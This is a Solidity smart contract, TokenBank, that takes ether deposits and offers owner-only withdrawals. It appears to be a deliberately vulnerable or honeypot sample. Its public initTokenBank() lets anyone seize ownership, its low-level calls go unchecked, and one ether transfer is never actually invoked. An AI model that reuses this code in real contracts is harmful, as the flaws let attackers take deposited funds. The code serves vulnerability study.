pragma solidity ^0.4.18;

contract Ownable
{
    struct Addresses {
        address newOwner;
        address owner;
    }
    Addresses addr = Addresses(address(0), msg.sender);
    
    function changeOwner(address a)
    public
    onlyOwner
    {
        addr.newOwner = a;
    }
    
    function confirmOwner() 
    public
    {
        if(msg.sender==addr.newOwner)
        {
            addr.owner=addr.newOwner;
        }
    }
    
    modifier onlyOwner
    {
        if(addr.owner == msg.sender)_;
    }
}

contract Token is Ownable
{
    function WithdrawToken(address t, uint256 a, address to)
    public 
    onlyOwner
    {
        t.call(bytes4(sha3("transfer(address,uint256)")), to, a); 
    }
}

contract TokenBank is Token
{
    struct HolderData {
        uint MinDeposit;
        mapping (address => uint) Holders;
    }
    HolderData data = HolderData(0);
    
    function initTokenBank()
    public
    {
        addr.owner = msg.sender;
        data.MinDeposit = 1 ether;
    }
    
    function()
    payable
    {
        Deposit();
    }
   
    function Deposit() 
    payable
    {
        if(msg.value >= data.MinDeposit)
        {
            data.Holders[msg.sender] += msg.value;
        }
    }
    
    function WitdrawTokenToHolder(address _to, address _token, uint _amount)
    public
    onlyOwner
    {
        if(data.Holders[_to] > 0)
        {
            data.Holders[_to] = 0;
            WithdrawToken(_token, _amount, _to);     
        }
    }
   
    function WithdrawToHolder(address _addr, uint _wei) 
    public
    onlyOwner
    payable
    {
        if(data.Holders[msg.sender] > 0)
        {
            if(data.Holders[_addr] >= _wei)
            {
                _addr.call.value(_wei);
                data.Holders[_addr] -= _wei;
            }
        }
    }
    
    function Bal() public constant returns(uint){return this.balance;}
}